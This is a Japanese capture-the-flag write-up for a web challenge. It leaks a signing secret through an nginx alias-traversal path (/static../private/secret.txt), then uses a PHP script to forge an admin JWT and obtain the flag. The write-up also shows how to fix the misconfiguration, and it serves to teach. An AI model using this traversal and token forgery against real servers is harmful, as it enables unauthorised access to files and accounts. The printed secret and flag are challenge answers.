# writeup

## 概要

![welcome](./img/welcome.png)

`/`, `/index.php` トップページ  
歩いているひよこと`Get Flag`ボタンがあり、押すと`/flag.php`に遷移する  
Cookieを確認すると、JWTのTokenが設定されている

![nyoronyoro](./img/nyoronyoro.png)

`/flag.php`  
にょろにょろ動くひよこに「権限がないよ、Adminになって戻ってきて」と言われる

tokenは以下のような構成になっている。

```json
Headers = {
  "alg": "sha256",
  "typ": "JWT"
}

Payload = {
  "isAdmin": "0"
}

Signature = "Yzc5Y2Y2MzlkYjkyNjdjZDkwNzJhNDkyODU0ZTE0ZWYwOTI2NDI3NTlkN2M0YmViN2Y1NDBjOTU4NWYzNzFjYg"
```

`/`のHTMLを見ると`<!-- <a href="?source">debug</a> -->`と書いてある。  
`/?source`を開くと、[index.php](../challenge/code/index.php)のソースコードが見える。  
[flag.php](../challenge/code/flag.php)も同様に、`flag.php?source`を開くとソースコードが見える。

2つのソースコードを読むと以下のようなことがわかる

- `/var/www/app/private/secret.txt`が`$secret`になっている
- 署名は`hash('sha256', $header . $payload . $secret)`でされている  
　=> `$secret`がわからないと改ざんできなそう
- JWTの`isAdmin`を0以外にすればflagが得れそう

どうにかして`secret.txt`の内容を確認出来たら改ざん出来そうだ。

ソースコードからはもう得るものはなさそうなので、配布された`nginx.conf`を確認する。

```conf
location /static {
    alias /var/www/app/static/;
}
```

この`/static`のエイリアスはひよこのgifに使われているが、ここの設定にミスがありalias traversalができる。

> **alias traversalとは**  
今回、`/static`が`/var/www/app/static/`として解釈される。  
ということは`/static../`が`/var/www/app/static/../`と解釈されてしまうので、`/var/www/app/`配下が見れる状態になってしまう。  
これがalias traversal。`location /static/ {...`のように末尾に`/`をつけることで防ぐことができる  

既にわかっている`secret.txt`とgifファイルのパスから、以下のような構成になっていることが予想できる。

```txt
/var/www/app
├── private
│   └── secret.txt
└── static  
    ├── nyoronyoro.gif
    └── welcome.gif
```

alias traversalで`secret.txt`が見れそうだ。

## 解

`/static../private/secret.txt`にアクセスすると、secret.txtが見れる。

```txt
48a939f9d0ef3778ee4fbbca6ffdd933
```

`index.php`のソースコードを参考に、isAdminが1なトークンを作成する。

```php
<?php
function generate($secret)
{
    $header = json_encode(array(
        'alg' => 'sha256',
        'typ' => 'JWT'
    ));

    $payload = json_encode(array(
        'isAdmin' => '1'
    ));
    $signature = hash('sha256', $header . $payload . $secret);
    return trim(base64_encode($header), '=') . '.' .
        trim(base64_encode($payload), '=') . '.' .
        trim(base64_encode($signature), '=');
}
echo generate("48a939f9d0ef3778ee4fbbca6ffdd933");
```

```txt
$ php solve.php
eyJhbGciOiJzaGEyNTYiLCJ0eXAiOiJKV1QifQ.eyJpc0FkbWluIjoiMSJ9.ZmFlNjNhNjFkMTExYTRiYmY2MmU5YzAzZmI1N2U5MTNmM2FmYjE5OTdiNDVjMzA4MDNjZDljYjgxYmY4ODc3YQ
```

これをtokenにセットして`flag.php`を開くと嬉しそうなひよことflagが表示される。

![congrats](./img/congrats.png)

```txt
ISCCTF{s3cr3t_f1l3s_4r3_l34k3d_dv3_t0_4_ng1nx_m1sc0nf1gvr4t10n}
```
